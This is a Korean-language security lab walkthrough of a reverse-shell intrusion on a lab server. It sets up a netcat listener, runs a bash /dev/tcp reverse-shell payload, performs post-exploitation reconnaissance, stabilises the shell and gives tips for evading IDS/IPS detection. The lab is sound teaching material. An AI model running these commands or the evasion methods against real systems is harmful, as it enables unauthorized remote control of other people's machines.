Cyber Security Lab LAB-SEC-02 | Meta Server Intrusion

리버스 커넥션 (Reverse Connection)
대상: 메타 서버(Meta Server, 192.168.10.13)

TARGET: 192.168.10.13

System Architect Pro

1. 아키텍처 개요 (Architecture Overview)

메타 서버(Meta Server) 내부망에 위치한 타깃은 외부 인바운드 연결을 강력하게 통제하고 있습니다. 하지만 서버 내부에서 외부로 나가는 아웃바운드(Outbound) 통신은 허용되는 경우가 많으므로, 이를 활용하여 리버스 셸(Reverse Shell)을 성립시킵니다.

[도식: 리버스 커넥션 흐름도]

공격자 (Listener)
192.168.10.100:4444
Backdoor Connection
메타 서버 (Meta Server)
192.168.10.13

2. 실증 및 구현 (Implementation)

작업 위치: 공격자 터미널 (Kali Linux)
01

리스너 활성화 (Setting up Listener)

Option Details
  • -l: Listen (포트를 열고 대기)
  • -v: Verbose (연결 상태 상세 출력)
  • -n: Numeric (IP 주소 확인 시 DNS 미사용)
  • -p: Port (대기할 포트 번호 지정)
$ nc -lvnp 4444
listening on [any] 4444 ... # 현재 공격자 머신의 4444 포트가 개방됨
connect to [192.168.10.100] from (UNKNOWN) [192.168.10.13] 58122 # 타깃(메타 서버)으로부터 역방향 연결 성공
작업 위치: 메타 서버 (Meta Server, 192.168.10.13)
02

페이로드 실행 (Payload Execution)

취약점을 통해 대상 서버에서 아래 명령어를 실행하여 공격자에게 셸을 전달합니다.

$ bash -i >& /dev/tcp/192.168.10.100/4444 0>&1
코드 분석 (Code Breakdown)
  • bash -i: 대화형(Interactive) 배시 셸을 실행합니다.
  • >& /dev/tcp/...: 표준 출력(stdout)과 에러(stderr)를 해당 네트워크 소켓으로 전송합니다.
  • 0>&1: 표준 입력(stdin)을 표준 출력 스트림으로 연결하여 공격자의 명령을 수신 가능하게 합니다.
작업 위치: 공격자 터미널 (획득한 셸 내부)
03

침투 후 작업 (Post-Exploitation)

A. 사용자 식별 및 권한 확인

$ id && whoami && uname -a
uid=1001(meta-user) gid=1001(meta-user) groups=1001(meta-user),27(sudo) # 현재 계정의 UID/GID 및 sudo 그룹 소속 확인
meta-user # 현재 세션의 사용자 이름
Linux meta-server 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux # 커널 버전 정보 수집 (권한 상승 취약점 탐색용)

B. 내부 네트워크 구성 파악

$ ip addr show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 # 인터페이스 상태 활성
    link/ether 08:00:27:ae:91:3c brd ff:ff:ff:ff:ff:ff # MAC 주소 정보
    inet 192.168.10.13/24 brd 192.168.10.255 scope global eth0 # 대상 서버의 내부 IP (192.168.10.13) 확정

3. 아키텍트 인사이트 (Expert Insight)

세션 안정화 (Shell Stabilization)

Bash 리버스 셸은 방향키 사용이나 Ctrl+C 시 세션이 종료되는 취약점이 있습니다. python3 -c 'import pty; pty.spawn("/bin/bash")' 명령어를 통해 가상 터미널(PTY)을 생성하여 안정적인 작업 환경을 확보하는 것이 필수입니다.

탐지 우회 전략 (Evasion)

대부분의 보안 솔루션(IDS/IPS)은 4444 포트와 /dev/tcp 문자열을 탐지합니다. 실제 진단 시에는 HTTP(80) 또는 HTTPS(443) 포트를 사용하고, 페이로드를 Base64로 인코딩하여 전송함으로써 탐지 확률을 최소화해야 합니다.
